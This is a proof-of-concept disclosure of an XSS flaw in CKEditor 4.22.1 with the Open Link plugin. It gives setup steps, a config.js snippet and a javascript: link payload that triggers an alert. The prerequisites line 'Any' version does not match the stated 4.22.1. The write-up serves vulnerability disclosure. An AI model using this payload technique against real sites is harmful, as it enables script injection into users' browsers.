# Proof of Concept: Exploiting XSS Flaw in CKEditor 4

## Vulnerability Overview

This Proof of Concept (POC) demonstrates an XSS vulnerability in CKEditor version 4.22.1 when the Open Link plugin is installed and configured. The flaw allows JavaScript execution through crafted links within the editor.

## Prerequisites

1. **CKEditor Version**: Any
2. **Open Link Plugin**: https://ckeditor.com/cke4/addon/openlink

## Setup Instructions

1. **Download CKEditor 4**:
   - Use the custom builder to include the Open Link plugin while downloading CKEditor from the official website.

   ![Custom Builder Screenshot](Screenshot_2024-05-23_at_5.01.02_PM.png)

2. **Install Open Link Plugin**:
   - Download the Open Link plugin from [here](https://ckeditor.com/cke4/addon/openlink).
   - Extract and place the contents into the `ckeditor/plugins/openlink` directory.

3. **Update Configuration**:
   - Modify the `config.js` file of CKEditor by adding the following lines:

   ```javascript
   config.extraPlugins = 'openlink';
   config.linkShowTargetTab = false; // Hide link target tab
   config.openlink_modifier = 0; // No modifier for opening links
   config.openlink_enableReadOnly = true; // Allow links to open in read-only mode
   ```

   - Example `config.js`:

   ```javascript
   CKEDITOR.editorConfig = function( config ) {
       // Define changes to default configuration here.
       config.extraPlugins = 'openlink';
       config.linkShowTargetTab = false;
       config.openlink_modifier = 0;
       config.openlink_enableReadOnly = true;
   };
   ```

4. **Include Plugin in HTML**:
   - Ensure the Open Link plugin is included in your HTML file that initializes CKEditor.

   ```html
   <!DOCTYPE html>
   <html>
   <head>
       <script src="path/to/ckeditor/ckeditor.js"></script>
   </head>
   <body>
       <textarea name="editor1" id="editor1"></textarea>
       <script>
           CKEDITOR.replace('editor1');
       </script>
   </body>
   </html>
   ```

   ![Demo Page Screenshot](Screenshot_2024-05-23_at_5.20.24_PM.png)

## Reproduction Steps

1. **Insert Payload**:
   - Open the CKEditor instance and click on the "Source" icon.
   - Insert the following payload in the text area:

     ```html
     <a href="javascript:alert('XSS Found')">XSS</a>
     ```

   ![Payload Insertion Screenshot](Screenshot_2024-05-23_at_5.24.59_PM.png)

2. **Switch to WYSIWYG Mode**:
   - Click on the "Source" icon again to switch back to the WYSIWYG mode.
   - Observe that the hyperlink becomes clickable inside the editor.

   ![Clickable Hyperlink Screenshot](Screenshot_2024-05-23_at_5.29.18_PM.png)

3. **Trigger XSS**:
   - Click on the hyperlink within the editor.
   - Observe that the XSS payload is triggered, resulting in an alert box in a new tab.

   ![XSS Triggered Screenshot](Screenshot_2024-05-23_at_5.33.15_PM.png)

## Conclusion

This POC demonstrates the exploitation of an XSS vulnerability in CKEditor 4.22.1 with the Open Link plugin. The flaw allows arbitrary JavaScript execution through specially crafted links, posing a significant security risk. Please ensure to follow best security practices and update configurations to mitigate such vulnerabilities.

Feel free to reach out for any queries or further assistance. 

Best Regards,  
Anurag Mondal
